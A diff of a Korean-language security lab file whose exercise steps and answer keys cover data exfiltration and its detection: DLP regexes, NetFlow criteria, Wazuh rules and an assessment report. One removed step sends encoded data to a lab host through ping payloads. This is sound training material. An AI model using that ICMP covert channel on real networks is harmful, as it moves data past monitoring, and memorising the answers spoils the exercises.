-    \ r'[\\w.+-]+@[\\w-]+\\.[\\w.-]+',\n}\n\nwith open('/tmp/sensitive_data.csv') as f:\n    content = f.read()\n\nprint('=== DLP Rule Analysis ===')\nfor name, pattern in rules.items():\n    matches =\
-    \ re.findall(pattern, content)\n    severity = 'CRITICAL' if len(matches) > 10 else 'WARNING' if len(matches) > 0 else 'OK'\n    print(f'Rule: {name:<15} Matches: {len(matches):>5}  Severity: {severity}')\n\
-    \    if matches:\n        print(f'  Sample: {matches[0]}')\n\nprint()\nprint('DLP Action: BLOCK transfer - 100+ PII records detected')\n\""
-  answer_detail: DLP는 정규식 패턴으로 민감 데이터(PII)를 식별하고 유출을 차단한다. 신용카드(Luhn 알고리즘), SSN(XXX-XX-XXXX), 이메일 패턴을 매칭하고, 임계값(10건 이상)을 초과하면 전송을 차단한다. 패턴 매칭 + 임계값 + 컨텍스트를 결합하여 오탐을 줄인다.
+  answer: "python3 -c \"\nimport re\nrules = {\n    'credit_card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk': r'[\\w.+-]+@[\\w-]+\\\
+    .[\\w.-]+',\n}\nwith open('/tmp/sensitive_data.csv') as f:\n    content = f.read()\nprint('=== DLP Rule Analysis ===')\nfor name, pattern in rules.items():\n    matches = re.findall(pattern, content)\n\
+    \    severity = 'CRITICAL' if len(matches) > 10 else 'WARNING' if len(matches) > 0 else 'OK'\n    print(f'Rule: {name:<15} Matches: {len(matches):>5}  Severity: {severity}')\n    if matches:\n     \
+    \   print(f'  Sample: {matches[0]}')\nprint('DLP Action: BLOCK transfer - 100+ PII records detected')\n\""
+  answer_detail: DLP는 정규식으로 민감 데이터(PII)를 식별하고 유출을 차단한다. 카드번호, SSN, 이메일 패턴을 매칭하고 임계값 초과 시 전송을 차단한다.
   verify:
     type: output_contains
     expect: DLP Rule Analysis
-  target_vm: attacker
-  script: "python3 -c \"\nimport re\n\n# DLP Rules\nrules = {\n    'credit_card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13})\\b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk':\
-    \ r'[\\w.+-]+@[\\w-]+\\.[\\w.-]+',\n}\n\nwith open('/tmp/sensitive_data.csv') as f:\n    content = f.read()\n\nprint('=== DLP Rule Analysis ===')\nfor name, pattern in rules.items():\n    matches =\
-    \ re.findall(pattern, content)\n    severity = 'CRITICAL' if len(matches) > 10 else 'WARNING' if len(matches) > 0 else 'OK'\n    print(f'Rule: {name:<15} Matches: {len(matches):>5}  Severity: {severity}')\n\
-    \    if matches:\n        print(f'  Sample: {matches[0]}')\n\nprint()\nprint('DLP Action: BLOCK transfer - 100+ PII records detected')\n\""
+  target_vm: secu
+  script: "python3 -c \"\nimport re\nrules = {\n    'credit_card': r'\\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})\\b',\n    'ssn': r'\\b\\d{3}-\\d{2}-\\d{4}\\b',\n    'email_bulk': r'[\\w.+-]+@[\\w-]+\\\
+    .[\\w.-]+',\n}\nwith open('/tmp/sensitive_data.csv') as f:\n    content = f.read()\nprint('=== DLP Rule Analysis ===')\nfor name, pattern in rules.items():\n    matches = re.findall(pattern, content)\n\
+    \    severity = 'CRITICAL' if len(matches) > 10 else 'WARNING' if len(matches) > 0 else 'OK'\n    print(f'Rule: {name:<15} Matches: {len(matches):>5}  Severity: {severity}')\n    if matches:\n     \
+    \   print(f'  Sample: {matches[0]}')\nprint('DLP Action: BLOCK transfer - 100+ PII records detected')\n\""
   risk_level: low
-- order: 9
-  instruction: ICMP를 이용한 데이터 유출을 시뮬레이션하고 탐지하라. ping 패킷의 데이터 영역에 정보를 은닉하는 기법을 테스트하라.
-  hint: ping -p 옵션으로 커스텀 데이터를 패킷에 포함한다.
-  category: exploit
-  points: 10
-  answer: 'echo -n ''EXFIL_TEST_DATA'' | xxd -p | head -c 32 > /tmp/icmp_payload.txt && echo "ICMP payload (hex): $(cat /tmp/icmp_payload.txt)" && ping -c 2 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1
-    | head -5; echo ''---''; echo ''Detection: Monitor ICMP payload size > 64 bytes and non-standard patterns'''
-  answer_detail: 'ICMP Exfiltration(T1048.003)은 ping 패킷의 데이터 영역에 정보를 은닉한다. -p 옵션으로 커스텀 패턴을 지정하면 16바이트의 데이터를 전송할 수 있다. 대부분의 방화벽은 ICMP를 허용하므로 유출 채널로 악용 가능하다. 탐지: ICMP 페이로드 크기와 내용 검사.'
-  verify:
-    type: output_contains
-    expect: ICMP payload
-  target_vm: attacker
-  script: 'echo -n ''EXFIL_TEST_DATA'' | xxd -p | head -c 32 > /tmp/icmp_payload.txt && echo "ICMP payload (hex): $(cat /tmp/icmp_payload.txt)" && ping -c 2 -p $(cat /tmp/icmp_payload.txt) 10.20.30.1 2>&1
-    | head -5; echo ''---''; echo ''Detection: Monitor ICMP payload size > 64 bytes and non-standard patterns'''
-  risk_level: medium
-- order: 10
-  instruction: 네트워크 플로우 분석으로 데이터 유출을 탐지하라. NetFlow/IPFIX 데이터에서 비정상적인 아웃바운드 트래픽 패턴을 식별하는 기준을 수립하라.
-  hint: 바이트 수, 패킷 수, 세션 지속 시간, 목적지 다양성을 분석한다.
-  category: defense
-  points: 10
-  answer: "cat > /tmp/netflow_exfil_detection.txt << 'EOF'\n=== NetFlow-based Exfiltration Detection Criteria ===\n\n1. Volume Anomaly:\n   - Outbound bytes/hour > 2x baseline for source IP\n   - Single\
-    \ destination receiving >100MB in 1 hour\n   - Alert: bytes_out/bytes_in ratio > 10 (data flowing out)\n\n2. Timing Anomaly:\n   - Data transfer outside business hours (22:00-06:00)\n   - Sustained\
-    \ connections >4 hours to external IP\n   - Regular interval transfers (beacon + exfil pattern)\n\n3. Destination Anomaly:\n   - New external IP never seen before\n   - Destination in high-risk country\n\
-    \   - Destination domain age < 30 days\n   - Cloud storage domains (drive.google, dropbox.com)\n\n4. Protocol Anomaly:\n   - DNS query volume > 500/hour per host\n   - ICMP packets > 100/hour per host\n\
-    \   - Non-standard ports with high data volume\n\n5. Scoring: Sum of anomaly scores > threshold → ALERT\nEOF\ncat /tmp/netflow_exfil_detection.txt"
-  answer_detail: NetFlow 분석은 패킷 내용을 검사하지 않고 트래픽 메타데이터(출발/도착 IP, 포트, 바이트, 패킷 수, 시간)만으로 유출을 탐지한다. 볼륨, 타이밍, 목적지, 프로토콜의 4가지 축에서 이상을 점수화하고 임계값을 초과하면 알림을 발생시킨다.
-  verify:
-    type: output_contains
-    expect: NetFlow-based
-  target_vm: attacker
-  script: "cat > /tmp/netflow_exfil_detection.txt << 'EOF'\n=== NetFlow-based Exfiltration Detection Criteria ===\n\n1. Volume Anomaly:\n   - Outbound bytes/hour > 2x baseline for source IP\n   - Single\
-    \ destination receiving >100MB in 1 hour\n   - Alert: bytes_out/bytes_in ratio > 10 (data flowing out)\n\n2. Timing Anomaly:\n   - Data transfer outside business hours (22:00-06:00)\n   - Sustained\
-    \ connections >4 hours to external IP\n   - Regular interval transfers (beacon + exfil pattern)\n\n3. Destination Anomaly:\n   - New external IP never seen before\n   - Destination in high-risk country\n\
-    \   - Destination domain age < 30 days\n   - Cloud storage domains (drive.google, dropbox.com)\n\n4. Protocol Anomaly:\n   - DNS query volume > 500/hour per host\n   - ICMP packets > 100/hour per host\n\
-    \   - Non-standard ports with high data volume\n\n5. Scoring: Sum of anomaly scores > threshold → ALERT\nEOF\ncat /tmp/netflow_exfil_detection.txt"
-  risk_level: low
-- order: 11
-  instruction: 클라우드 서비스를 이용한 데이터 유출(Cloud Exfiltration)을 분석하라. 합법적 클라우드 서비스를 악용하는 유출 시나리오와 탐지 방법을 정리하라.
-  hint: Google Drive, Dropbox, AWS S3 등을 악용하는 시나리오를 분석한다.
-  category: analysis
-  points: 10
-  answer: "cat > /tmp/cloud_exfil_analysis.txt << 'EOF'\n=== Cloud Service Exfiltration Analysis ===\n\n1. Attack Vectors:\n   - Google Drive/Dropbox: File upload via API (T1567.002)\n   - AWS S3: Write\
-    \ to attacker-owned bucket\n   - GitHub/GitLab: Push to private repository\n   - Slack/Teams: File sharing in DM\n   - Pastebin: Text data paste\n\n2. Why Difficult to Detect:\n   - Same domains as\
-    \ legitimate business use\n   - Traffic is HTTPS encrypted\n   - API calls look identical to normal usage\n   - Cloud domains on allowlists\n\n3. Detection Strategies:\n   - CASB (Cloud Access Security\
-    \ Broker)\n   - DLP integration with cloud APIs\n   - User behavior analytics (UBA)\n   - Monitor: upload volume per user per day\n   - Block: personal cloud accounts (SSO only)\n\n4. Prevention:\n\
-    \   - Cloud DLP policies (Google Workspace, M365)\n   - Restrict file sharing to organization only\n   - Block unauthorized cloud storage at proxy\n   - API token monitoring and rotation\nEOF\ncat /tmp/cloud_exfil_analysis.txt"
-  answer_detail: 클라우드 서비스 악용 유출(T1567)은 합법적 서비스의 API를 사용하므로 도메인 차단이 어렵다. CASB(Cloud Access Security Broker)로 클라우드 API 호출을 모니터링하고, UBA(User Behavior Analytics)로 비정상 업로드 패턴을 탐지하며, 조직 외부 공유를 차단한다.
-  verify:
-    type: output_contains
-    expect: Cloud Service Exfiltration
-  target_vm: attacker
-  script: "cat > /tmp/cloud_exfil_analysis.txt << 'EOF'\n=== Cloud Service Exfiltration Analysis ===\n\n1. Attack Vectors:\n   - Google Drive/Dropbox: File upload via API (T1567.002)\n   - AWS S3: Write\
-    \ to attacker-owned bucket\n   - GitHub/GitLab: Push to private repository\n   - Slack/Teams: File sharing in DM\n   - Pastebin: Text data paste\n\n2. Why Difficult to Detect:\n   - Same domains as\
-    \ legitimate business use\n   - Traffic is HTTPS encrypted\n   - API calls look identical to normal usage\n   - Cloud domains on allowlists\n\n3. Detection Strategies:\n   - CASB (Cloud Access Security\
-    \ Broker)\n   - DLP integration with cloud APIs\n   - User behavior analytics (UBA)\n   - Monitor: upload volume per user per day\n   - Block: personal cloud accounts (SSO only)\n\n4. Prevention:\n\
-    \   - Cloud DLP policies (Google Workspace, M365)\n   - Restrict file sharing to organization only\n   - Block unauthorized cloud storage at proxy\n   - API token monitoring and rotation\nEOF\ncat /tmp/cloud_exfil_analysis.txt"
-  risk_level: low
-- order: 12
-  instruction: 데이터 유출 방지를 위한 종합 DLP 아키텍처를 설계하라. 네트워크, 엔드포인트, 클라우드 레벨의 다층 DLP를 구성하라.
-  hint: Network DLP, Endpoint DLP, Cloud DLP의 역할을 분담한다.
-  category: defense
-  points: 10
-  answer: "cat > /tmp/dlp_architecture.txt << 'EOF'\n=== Comprehensive DLP Architecture ===\n\n                    [Cloud DLP]\n                   CASB + API Monitor\n                        |\n[Endpoint\
-    \ DLP] --- [Network DLP] --- [Internet]\n  Agent-based        Proxy/IDS\n  File monitor       TLS inspect\n  USB control        NetFlow analysis\n  Clipboard          DNS filtering\n\n1. Network DLP\
-    \ (10.20.30.0/24 perimeter):\n   - Squid proxy with SSL bump\n   - Suricata with DLP rules\n   - DNS sinkhole + entropy analysis\n   - NetFlow volume anomaly detection\n\n2. Endpoint DLP (each host):\n\
-    \   - File access monitoring (auditd)\n   - USB device control (udev rules)\n   - Clipboard monitoring\n   - Process-network correlation\n\n3. Cloud DLP:\n   - CASB for SaaS monitoring\n   - API call\
-    \ auditing\n   - File sharing restrictions\n   - Data classification labels\n\n4. Data Classification:\n   - PUBLIC: No restrictions\n   - INTERNAL: Block external email\n   - CONFIDENTIAL: Block all\
-    \ external transfer\n   - RESTRICTED: Block + alert + encrypt at rest\nEOF\ncat /tmp/dlp_architecture.txt"
-  answer_detail: 종합 DLP 아키텍처는 네트워크(프록시, IDS), 엔드포인트(에이전트, 감사), 클라우드(CASB) 3계층으로 구성한다. 데이터 분류(Public→Restricted)에 따라 차등 정책을 적용하며, 각 계층이 상호 보완하여 단일 지점 우회를 방지한다.
-  verify:
-    type: output_contains
-    expect: Comprehensive DLP
-  target_vm: attacker
-  script: "cat > /tmp/dlp_architecture.txt << 'EOF'\n=== Comprehensive DLP Architecture ===\n\n                    [Cloud DLP]\n                   CASB + API Monitor\n                        |\n[Endpoint\
-    \ DLP] --- [Network DLP] --- [Internet]\n  Agent-based        Proxy/IDS\n  File monitor       TLS inspect\n  USB control        NetFlow analysis\n  Clipboard          DNS filtering\n\n1. Network DLP\
-    \ (10.20.30.0/24 perimeter):\n   - Squid proxy with SSL bump\n   - Suricata with DLP rules\n   - DNS sinkhole + entropy analysis\n   - NetFlow volume anomaly detection\n\n2. Endpoint DLP (each host):\n\
-    \   - File access monitoring (auditd)\n   - USB device control (udev rules)\n   - Clipboard monitoring\n   - Process-network correlation\n\n3. Cloud DLP:\n   - CASB for SaaS monitoring\n   - API call\
-    \ auditing\n   - File sharing restrictions\n   - Data classification labels\n\n4. Data Classification:\n   - PUBLIC: No restrictions\n   - INTERNAL: Block external email\n   - CONFIDENTIAL: Block all\
-    \ external transfer\n   - RESTRICTED: Block + alert + encrypt at rest\nEOF\ncat /tmp/dlp_architecture.txt"
-  risk_level: low
-- order: 13
-  instruction: Wazuh에서 데이터 유출 시도를 탐지하는 규칙을 작성하라. 대량 파일 접근, 비정상 네트워크 전송, USB 장치 연결을 탐지하라.
+- order: 7
+  instruction: '[BLUE] Wazuh에서 데이터 유출 시도를 탐지하는 규칙을 작성하라. 대량 파일 접근, DNS 터널링, USB 장치 연결을 탐지하고 상관 분석하라.'
   hint: Wazuh 규칙 XML 형식으로 작성한다.
   category: defense
   points: 10
-  answer: "cat > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\">\n  <rule id=\"100200\" level=\"12\" frequency=\"50\" timeframe=\"300\">\n    <if_sid>554</if_sid>\n    <match>open|read</match>\n\
-    \    <description>Mass file access detected: 50+ file reads in 5 minutes (possible data staging)</description>\n    <mitre><id>T1005</id></mitre>\n  </rule>\n  <rule id=\"100201\" level=\"10\">\n  \
-    \  <if_sid>5710</if_sid>\n    <match>usb-storage</match>\n    <description>USB storage device connected - potential exfiltration vector</description>\n    <mitre><id>T1052.001</id></mitre>\n  </rule>\n\
-    \  <rule id=\"100202\" level=\"12\">\n    <if_group>syslog</if_group>\n    <match>DNS_TUNNEL|dns_tunnel|high_entropy</match>\n    <description>DNS tunneling activity detected - possible data exfiltration</description>\n\
-    \    <mitre><id>T1048.001</id></mitre>\n  </rule>\n  <rule id=\"100203\" level=\"14\" frequency=\"3\" timeframe=\"600\">\n    <if_matched_group>data_exfiltration</if_matched_group>\n    <description>CRITICAL:\
-    \ Multiple exfiltration indicators in 10 minutes</description>\n  </rule>\n</group>\nEOF\ncat /tmp/wazuh_dlp_rules.xml"
-  answer_detail: Wazuh DLP 규칙은 대량 파일 접근(T1005), USB 장치 연결(T1052.001), DNS 터널링(T1048.001)을 개별 탐지하고, 상관 규칙(100203)으로 10분 내 3개 이상 지표가 발생하면 CRITICAL 알림을 발생시킨다.
+  answer: "cat > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\">\n  <rule id=\"100300\" level=\"12\" frequency=\"50\" timeframe=\"300\">\n    <if_sid>554</if_sid>\n    <match>open|read</match>\n\
+    \    <description>Mass file access: 50+ reads in 5 min (data staging)</description>\n    <mitre><id>T1005</id></mitre>\n  </rule>\n  <rule id=\"100301\" level=\"12\">\n    <if_group>syslog</if_group>\n\
+    \    <match>DNS_TUNNEL|dns_tunnel|high_entropy</match>\n    <description>DNS tunneling activity detected</description>\n    <mitre><id>T1048.001</id></mitre>\n  </rule>\n  <rule id=\"100302\" level=\"\
+    14\" frequency=\"3\" timeframe=\"600\">\n    <if_matched_group>data_exfiltration</if_matched_group>\n    <description>CRITICAL: Multiple exfiltration indicators in 10 min</description>\n  </rule>\n\
+    </group>\nEOF\ncat /tmp/wazuh_dlp_rules.xml"
+  answer_detail: Wazuh DLP 규칙은 대량 파일 접근(T1005), DNS 터널링(T1048.001)을 개별 탐지하고, 상관 규칙으로 10분 내 3개 이상 지표 발생 시 CRITICAL 알림을 발생시킨다.
   verify:
     type: output_contains
     expect: data_exfiltration
-  target_vm: attacker
-  script: "cat > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\">\n  <rule id=\"100200\" level=\"12\" frequency=\"50\" timeframe=\"300\">\n    <if_sid>554</if_sid>\n    <match>open|read</match>\n\
-    \    <description>Mass file access detected: 50+ file reads in 5 minutes (possible data staging)</description>\n    <mitre><id>T1005</id></mitre>\n  </rule>\n  <rule id=\"100201\" level=\"10\">\n  \
-    \  <if_sid>5710</if_sid>\n    <match>usb-storage</match>\n    <description>USB storage device connected - potential exfiltration vector</description>\n    <mitre><id>T1052.001</id></mitre>\n  </rule>\n\
-    \  <rule id=\"100202\" level=\"12\">\n    <if_group>syslog</if_group>\n    <match>DNS_TUNNEL|dns_tunnel|high_entropy</match>\n    <description>DNS tunneling activity detected - possible data exfiltration</description>\n\
-    \    <mitre><id>T1048.001</id></mitre>\n  </rule>\n  <rule id=\"100203\" level=\"14\" frequency=\"3\" timeframe=\"600\">\n    <if_matched_group>data_exfiltration</if_matched_group>\n    <description>CRITICAL:\
-    \ Multiple exfiltration indicators in 10 minutes</description>\n  </rule>\n</group>\nEOF\ncat /tmp/wazuh_dlp_rules.xml"
+  target_vm: siem
+  script: "cat > /tmp/wazuh_dlp_rules.xml << 'EOF'\n<group name=\"data_exfiltration\">\n  <rule id=\"100300\" level=\"12\" frequency=\"50\" timeframe=\"300\">\n    <if_sid>554</if_sid>\n    <match>open|read</match>\n\
+    \    <description>Mass file access: 50+ reads in 5 min (data staging)</description>\n    <mitre><id>T1005</id></mitre>\n  </rule>\n  <rule id=\"100301\" level=\"12\">\n    <if_group>syslog</if_group>\n\
+    \    <match>DNS_TUNNEL|dns_tunnel|high_entropy</match>\n    <description>DNS tunneling activity detected</description>\n    <mitre><id>T1048.001</id></mitre>\n  </rule>\n  <rule id=\"100302\" level=\"\
+    14\" frequency=\"3\" timeframe=\"600\">\n    <if_matched_group>data_exfiltration</if_matched_group>\n    <description>CRITICAL: Multiple exfiltration indicators in 10 min</description>\n  </rule>\n\
+    </group>\nEOF\ncat /tmp/wazuh_dlp_rules.xml"
   risk_level: low
-- order: 14
-  instruction: 실습 환경을 정리하라. 생성된 가짜 민감 데이터, 시뮬레이션 스크립트, 분석 파일을 모두 삭제하라.
-  hint: rm으로 /tmp 내 실습 파일을 삭제한다.
-  category: response
-  points: 5
-  answer: rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/https_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin /tmp/multichannel_*.txt /tmp/netflow_*.txt /tmp/cloud_*.txt /tmp/dlp_*.txt /tmp/tls_*.txt /tmp/icmp_*.txt
-    /tmp/wazuh_dlp_*.xml 2>/dev/null; echo 'Exfiltration lab cleanup completed'
-  answer_detail: 실습 환경 정리에서는 가짜 민감 데이터(가짜라도 PII 형식 파일은 삭제), 암호화된 유출 시뮬레이션 파일, 스크립트를 모두 삭제한다. 특히 sensitive_data.csv와 같은 PII 형식 파일은 반드시 제거해야 한다.
-  verify:
-    type: output_contains
-    expect: cleanup completed
-  target_vm: attacker
-  script: rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/https_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin /tmp/multichannel_*.txt /tmp/netflow_*.txt /tmp/cloud_*.txt /tmp/dlp_*.txt /tmp/tls_*.txt /tmp/icmp_*.txt
-    /tmp/wazuh_dlp_*.xml 2>/dev/null; echo 'Exfiltration lab cleanup completed'
-  risk_level: low
-- order: 15
-  instruction: 데이터 유출 기법 실습의 종합 보고서를 작성하라. 유출 기법별 대역폭, 탐지 난이도, 권장 대응책을 포함하라.
-  hint: DNS, HTTPS, ICMP, Cloud 각 채널의 특성과 방어 방법을 비교 정리한다.
+- order: 8
+  instruction: '[RED/BLUE] 환경을 정리하고 데이터 유출 평가 보고서를 작성하라. 유출 채널별 대역폭, 탐지 난이도, 방어 권장책을 포함하라.'
+  hint: DNS, HTTPS, ICMP 각 채널의 특성을 비교하고, 안티포렌식 대응책을 정리한다.
   category: analysis
   points: 15
-  answer: 'cat > /tmp/exfil_report.txt << ''EOF''
-
-    === Data Exfiltration Assessment Report ===
-
-    Date: 2026-04-03 | Scope: 10.20.30.0/24
-
-
-    | Channel | Bandwidth | Stealth | Detection Method | Prevention |
-
-    |---------|-----------|---------|-----------------|------------|
-
-    | DNS | ~50B/query | High | Entropy analysis | DNS filtering |
-
-    | HTTPS | ~1MB/req | Very High | TLS inspection | Proxy + DLP |
-
-    | ICMP | ~64B/pkt | Medium | Payload inspection | ICMP block |
-
-    | Cloud | ~100MB/s | High | CASB + UBA | API control |
-
-    | USB | ~100MB/s | Low | Agent DLP | USB policy |
-
-    | Stego | Variable | Very High | Statistical analysis | File scanning |
-
-
-    Key Findings:
-
-    [C-01] No DLP controls on any exfiltration channel
-
-    [C-02] DNS queries not filtered or analyzed
-
-    [H-01] No TLS inspection capability
-
-    [H-02] USB devices unrestricted
-
-
-    Recommendations:
-
-    1. Deploy Network DLP with TLS inspection
-
-    2. Implement DNS entropy monitoring
-
-    3. Restrict USB devices via endpoint policy
-
-    4. Deploy CASB for cloud service control
-
-    5. Establish data classification policy
-
-
-    MITRE ATT&CK: T1048.001, T1048.002, T1048.003, T1567.002, T1052.001, T1001.002
-
-    EOF
-
-    cat /tmp/exfil_report.txt'
-  answer_detail: 데이터 유출 평가 보고서는 각 유출 채널의 대역폭, 은밀성, 탐지 방법, 차단 수단을 비교 분석한다. DLP 부재, DNS 필터링 미적용, TLS 검사 미구현 등의 Gap을 식별하고 우선순위별 개선 방안을 제시한다.
+  answer: "rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin /tmp/icmp_*.txt /tmp/af_test.txt 2>/dev/null && cat > /tmp/exfil_report.txt << 'EOF'\n=== Data Exfiltration &\
+    \ Anti-Forensics Assessment ===\nDate: 2026-04-06 | Scope: 10.20.30.0/24\n\n1. Exfiltration Channels:\n   | Channel | Bandwidth | Stealth | Detection Method |\n   |---------|-----------|---------|------------------|\n\
+    \   | DNS | ~50B/query | High | Entropy analysis |\n   | HTTPS | ~1MB/req | Very High | TLS inspection |\n   | ICMP | ~64B/pkt | Medium | Payload inspection |\n\n2. Anti-Forensics Tested:\n   - Timestamp\
+    \ manipulation (T1070.006) -> Detect: FIM, auditd\n   - Log deletion (T1070.001) -> Detect: Remote log shipping\n   - History evasion (T1070.003) -> Detect: auditd process monitoring\n\n3. Key Findings:\n\
+    \   [C-01] No DLP controls on any channel\n   [C-02] DNS queries not filtered or analyzed\n   [H-01] No remote log backup (single point of failure)\n\n4. Recommendations:\n   - Deploy DNS entropy monitoring\n\
+    \   - Implement remote syslog to SIEM\n   - Enable auditd on all servers\n   - Deploy Network DLP at perimeter\n\nMITRE ATT&CK: T1048.001, T1048.002, T1048.003, T1070, T1005\nEOF\ncat /tmp/exfil_report.txt"
+  answer_detail: 보고서는 유출 채널별 특성, 안티포렌식 기법별 대응, 발견 사항, 권고사항을 포함한다. DLP 부재와 DNS 모니터링 미적용이 가장 심각한 Gap이다.
   verify:
     type: output_contains
-    expect: Exfiltration Assessment
+    expect: Exfiltration & Anti-Forensics
   target_vm: attacker
-  script: 'cat > /tmp/exfil_report.txt << ''EOF''
-
-    === Data Exfiltration Assessment Report ===
-
-    Date: 2026-04-03 | Scope: 10.20.30.0/24
-
-
-    | Channel | Bandwidth | Stealth | Detection Method | Prevention |
-
-    |---------|-----------|---------|-----------------|------------|
-
-    | DNS | ~50B/query | High | Entropy analysis | DNS filtering |
-
-    | HTTPS | ~1MB/req | Very High | TLS inspection | Proxy + DLP |
-
-    | ICMP | ~64B/pkt | Medium | Payload inspection | ICMP block |
-
-    | Cloud | ~100MB/s | High | CASB + UBA | API control |
-
-    | USB | ~100MB/s | Low | Agent DLP | USB policy |
-
-    | Stego | Variable | Very High | Statistical analysis | File scanning |
-
-
-    Key Findings:
-
-    [C-01] No DLP controls on any exfiltration channel
-
-    [C-02] DNS queries not filtered or analyzed
-
-    [H-01] No TLS inspection capability
-
-    [H-02] USB devices unrestricted
-
-
-    Recommendations:
-
-    1. Deploy Network DLP with TLS inspection
-
-    2. Implement DNS entropy monitoring
-
-    3. Restrict USB devices via endpoint policy
-
-    4. Deploy CASB for cloud service control
-
-    5. Establish data classification policy
-
-
-    MITRE ATT&CK: T1048.001, T1048.002, T1048.003, T1567.002, T1052.001, T1001.002
-
-    EOF
-
-    cat /tmp/exfil_report.txt'
+  script: "rm -f /tmp/sensitive_data.csv /tmp/dns_exfil.sh /tmp/exfil_*.gz /tmp/exfil_*.bin /tmp/icmp_*.txt /tmp/af_test.txt 2>/dev/null && cat > /tmp/exfil_report.txt << 'EOF'\n=== Data Exfiltration &\
+    \ Anti-Forensics Assessment ===\nDate: 2026-04-06 | Scope: 10.20.30.0/24\n\n1. Exfiltration Channels:\n   | Channel | Bandwidth | Stealth | Detection Method |\n   |---------|-----------|---------|------------------|\n\
+    \   | DNS | ~50B/query | High | Entropy analysis |\n   | HTTPS | ~1MB/req | Very High | TLS inspection |\n   | ICMP | ~64B/pkt | Medium | Payload inspection |\n\n2. Anti-Forensics Tested:\n   - Timestamp\
+    \ manipulation (T1070.006) -> Detect: FIM, auditd\n   - Log deletion (T1070.001) -> Detect: Remote log shipping\n   - History evasion (T1070.003) -> Detect: auditd process monitoring\n\n3. Key Findings:\n\
+    \   [C-01] No DLP controls on any channel\n   [C-02] DNS queries not filtered or analyzed\n   [H-01] No remote log backup (single point of failure)\n\n4. Recommendations:\n   - Deploy DNS entropy monitoring\n\
+    \   - Implement remote syslog to SIEM\n   - Enable auditd on all servers\n   - Deploy Network DLP at perimeter\n\nMITRE ATT&CK: T1048.001, T1048.002, T1048.003, T1070, T1005\nEOF\ncat /tmp/exfil_report.txt"
   risk_level: low
